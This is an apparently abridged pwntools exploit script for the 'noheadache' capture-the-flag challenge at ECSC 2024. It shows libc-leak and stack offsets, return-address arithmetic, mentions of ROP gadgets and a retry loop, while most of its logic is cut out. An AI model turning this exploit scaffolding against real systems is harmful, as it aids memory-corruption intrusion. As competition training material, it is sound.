...
from pwn import remote, p64, u64, flat, context, log, ELF, ROP


HOST = os.getenv('HOST', 'noheadache.challs.open.ecsc2024.it')
PORT = int(os.getenv('PORT', 38004))

# NOTE: these may need to be updated if the challenge is re-built
LIBC_LEAK_OFFSET          = 0x1d3560
MAIN_RETADDR_STACK_OFFSET = 0x120
...
def run(libc):
	...
	if libc.address & 0xfff != 0:
		log.warn('Bad libc address! Are exploit offsets correct?')
	...
	main_retaddr = stack_addr - MAIN_RETADDR_STACK_OFFSET
	buf_addr     = main_retaddr - BUF_STACK_OFFSET
	...
	# NOTE: these gadgets may need to be updated if the challenge is re-built
...
if __name__ == '__main__':
	...
	libc_path = mydir / '../src/build/libs/libc.so.6'
	if not libc_path.exists():
		sys.exit(f'No libc found at {libc_path}!')

	libc = ELF(libc_path, checksec=False)

	for i in range(1, 100 + 1):
		log.info('Attempt %d', i)
	...
	sys.exit('Exceeded 100 attempts!')
